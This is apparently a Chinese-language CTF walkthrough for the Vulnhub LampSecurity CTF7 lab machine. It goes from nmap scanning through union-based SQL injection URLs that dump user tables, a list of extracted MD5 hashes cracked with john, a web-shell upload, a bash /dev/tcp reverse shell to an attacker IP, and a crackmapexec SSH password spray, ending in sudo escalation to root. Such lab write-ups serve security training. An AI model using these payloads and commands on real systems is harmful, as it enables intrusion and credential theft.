
## 1.靶机描述

_这是一台标榜难度为简单的开源靶机。典型的 boot2root 模式。_

![des](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007161306769.png)


## 2.信息收集

1. 端口扫描


```text
# Nmap 7.99 scan initiated Mon Oct  5 11:45:56 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -oA nmapscan/TCPS 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.0014s latency).
Not shown: 987 filtered tcp ports (no-response), 6 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
139/tcp   open   netbios-ssn
901/tcp   open   samba-swat
5900/tcp  closed vnc
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt
MAC Address: 00:0C:29:BE:BA:B3 (VMware)

# Nmap done at Mon Oct  5 11:45:57 2026 -- 1 IP address (1 host up) scanned in 0.96 seconds
```


2. 详细信息扫描


```text
# Nmap 7.99 scan initiated Mon Oct  5 11:49:05 2026 as: /usr/lib/nmap/nmap -sT -sC -sV -O -p22,80,139,901,8080,10000 -oA nmapscan/details 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.00094s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 41:8a:0d:5d:59:60:45:c4:c4:15:f3:8a:8d:c0:99:19 (DSA)
|_  2048 66:fb:a3:b4:74:72:66:f4:92:73:8f:bf:61:ec:8b:35 (RSA)
80/tcp    open  http        Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Mad Irish Hacking Academy
139/tcp   open  netbios-ssn Samba smbd 3.5.10-125.el6 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
8080/tcp  open  http        Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
10000/tcp open  http        MiniServ 1.610 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
MAC Address: 00:0C:29:BE:BA:B3 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|storage-misc|media device|webcam
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X|5.X (97%), MikroTik RouterOS 7.X (91%), Drobo embedded (89%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:drobo:5n cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 2.6.32 - 3.13 (97%), Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.5.10-125.el6)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: localhost
|_  System time: 2026-09-20T06:30:20-04:00
|_clock-skew: mean: -14d15h19m03s, deviation: 2h49m45s, median: -14d17h19m06s
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  5 11:50:35 2026 -- 1 IP address (1 host up) scanned in 90.07 seconds
```


3. 漏洞脚本扫描


```text
# Nmap 7.99 scan initiated Mon Oct  5 13:03:21 2026 as: /usr/lib/nmap/nmap -sT --script=vuln -p22,80,139,901,8080,10000 -oA nmapscan/vulns 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.00072s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.182
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.182:80/signup
|     Form id: email
|_    Form action: /signup_scr
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /webmail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|_  /webalizer/: Potentially interesting folder
139/tcp   open  netbios-ssn
901/tcp   open  samba-swat
8080/tcp  open  http-proxy
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
| http-enum: 
|   /login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /docs/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
10000/tcp open  snet-sensor-mgmt
MAC Address: 00:0C:29:BE:BA:B3 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

# Nmap done at Mon Oct  5 13:04:53 2026 -- 1 IP address (1 host up) scanned in 91.80 seconds

```


## 3.WEB 渗透

#### 数字型 SQL 注入 

在信息收集和目录遍历的过程中，我发现 profile 界面存在一个可以注入的 id 参数。

![p1](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007162603625.png)

我们采用 union 联合注入的思维。先通过 order by 关键字确认目标网站的数据表一共有几列，这么操作是因为 union 关键字会将网站数据表和我们感兴趣的 information_schema 中的表一起查询，如果两个表的字段数不一样。查询就不会成功。

1. 确认字段数为 7

网站在我们指定第 8 个字段时，报错。但是当我们指定字段为 7 时，就返回成功的界面。说明网站查询的数据表有 7 个字段。

![p2](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007163206413.png)

![p3](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007163402182.png)

2. 确认界面回显点

通常存在SQL 注入的代码中，后端会把查询到的字段内容显示到前端界面中。为了得到我们指定数据表查询结果，我们需要知道前端渲染查询结果的位置。

我们先指定 id 为 -1。也可以为一个不正常的数字。使得网站数据表的查询失败。然后指定 union 占位符 。当我们 union 后的查询结果成功时，后端就会把我们的占位符输出到前端界面。我们就能获得回显点。

```text
http://10.10.10.182/profile&id=-1 union select 1,2,3,4,5,6,7 
```

这里 1，2...7 是我们的占位符。

![p4](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007164116896.png)

```text
http://10.10.10.182/profile&id=-1 union select database(),2,3,4,5,user(),version() 
```

![p5](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007164231165.png)

可以看到我们的查询已经成功执行了。

3. 读取 website 数据库 的 users 数据表

```text
http://10.10.10.182/profile&id=-1 union select group_concat(table_name),2,3,4,5,user(),version() from information_schema.tables where table_schema="website"
# 查 website 数据库所有表名

http://10.10.10.182/profile&id=-1 union select group_concat(column_name),2,3,4,5,user(),version() from information_schema.columns where table_name="users"
# 查数据表 users 的所有列名
```

![p6](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007164422669.png)

当我们直接读取数据表 users 的用户名密码信息时，我们发现前端界面一次只能显示一行的内容。但是数据表查询结果返回的不一定就只有这一行的数据。这种情况我们需要加上 limit 0,1 参数来指定显示的起始位置和显示长度问题。比如 limit 1，1 就是显示结果的第二行。

![p7](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007165039239.png)



最终我们获得了如下凭据

```text
brian@localhost.localdomain-:-e22f07b17f98e0d9d364584ced0e3c18
john@localhost.localdomain-:-0d9ff2a4396d6939f80ffe09b1280ee1
alice@localhost.localdomain-:-2146bf95e8929874fc63d54f50f1d2e3
ruby@localhost.localdomain-:-9f80ec37f8313728ef3e2f218c79aa23
leon@localhost.localdomain-:-5d93ceb70e2bf5daa84ec3d0cd2c731a
julia@localhost.localdomain-:-ed2539fe892d2c52c42a440354e8e3d5
michael@localhost.localdomain-:-9c42a1346e333a770904b2a2b37fa7d3
bruce@localhost.localdomain-:-3a24d81c2b9d0d9aaf2f10c6c9757d4e
neil@localhost.localdomain-:-4773408d5358875b3764db552a29ca61
charles@localhost.localdomain-:-b2a97bcecbd9336b98d59d9324dae5cf
foo@bar.com-:-4cb9c8a8048fd02294477fcb1a41191a
```

4. 凭据文本处理

我们使用 awk 工具进行文本处理，在 kali 终端输入以下指令，我们能够获得一个存有用户名的users.txt 文件，还有一个存有密码密文值的pass.txt文件。

```shell
awk -F '-:-' '{print $2}' >> pass.txt #保存为密码
awk -F '-:-' '{print $1}' >> users.txt #保存为用户名
awk -F '@' '{print $1}' > users.txt #保留 @ 前面的部分
```


#### john 破解 MD5 密码

我们通过 hash-identifier 工具鉴别密码为 MD5。接下来，我们使用 john 攻击来破解 MD5 密文。我们在终端中输入以下指令。

```text
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 creds.txt
```

![p8](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007170559816.png)

![p9](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007170836940.png)


#### 文件上传漏洞利用

1. 8080 端口 WEB 登录页面万能密码绕过

在登录界面的 Manage Offerings 列表中的 Readings 界面有文件上传的功能。

![p10](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007171741298.png)


![p11](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007175153506.png)

我们通过 dirb 进行网站目录扫描。我们发现上传的文件放在了 asset 文件夹下。

![p12](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007181646130.png)

2. MySQL 登录凭据获取

我们点击这个 1.php 文件，然后获得 web 的反弹 shell。获得反弹 shell后，我们发现当前的用户的权限比较低。WEB 服务器的数据库中存储着网站管理员的登录名和密码密文。在一般规模的公司中，网站管理人员和服务器运维人员是同一个人。因此，很有可能网站管理登录口令也是服务器运维的登录口令。所以为了获得网站管理员的密码，获得服务器其他人员的权限。我们需要登录 MySQL 数据库。

![p13](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007182041377.png)

为了获得 MySQL 的登录凭据，我们需要在网站服务器目录查找。最终发现inc 文件夹下 db.php 文件中写了登录凭据，MySQL 数据库是可以以 root 身份免密登录的。

![rootpass](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007184636958.png)


#### 登录数据库的查找敏感凭据

为了成功登录MySQL数据库，我们还需要执行一些操作。我们使用的反弹 shell 文件 1.php 。它的原理类似于这条命令的作用。

```shell
bash -i >& /dev/tcp/192.168.2.22/5566 0>&1
```

这条命令将 bash 终端的输入和输出进行重定向。但是不具备终端的功能。为了在目标靶机上登录数据库，我们需要生成一个伪终端。我们使用以下命令。这样我们为 apache 用户分配了一个 python 终端。接下来，我们就可以成功的执行 MySQL 登录命令。

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
mysql -uroot -p
```

![p14](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007183654089.png)

![p15](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007183746259.png)


## crackmapexec 密码喷洒

至此，殊途同归。我们已经获得 WEB 管理员们的全部凭据。考虑到管理员除了线下登录服务主机外，大部分是通过 ssh 登录到服务器。我们想利用这些凭据获得 ssh 的立足点。但是手工尝试各个密码有些费时间。这里我们使用一个自动化的工具 crackmapexec 。

```shell
sudo crackmapexec ssh 10.10.10.182 -u users.txt -p pass.txt --continue-on-success
```

--continue-on-success 这个参数的意思是当尝试成功时，继续尝试下一个凭据。为了聚焦于有效结果，我使用管道过滤出带有 "+" 的结果。

![p16](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007190138831.png)



## 登录 ssh 服务权限提升

我们使用 brain 用户的凭据登录服务器。我们进行权限枚举时，发现当前用户存在 sudo 的完整权限。我们直接使用 sudo -i 命令获得 root 权限。

![ssh1](../vulnhubScreenShot/(纯)Vulnhub%20LampSecurityCTF%207%20靶机渗透总结/IMG-20261007194601741.png)


## 总结

我们通过 web 页面，发现了网站存在 SQL 注入和 文件上传漏洞。通过 WEB 漏洞我们拿到登录凭据。我们使用 john 命令破解凭据的明文密码。成功登录 ssh 服务器。这台服务器恰好为我们登录的用户分配了完整的 sudo 权限。最终，成功拿下了 root shell。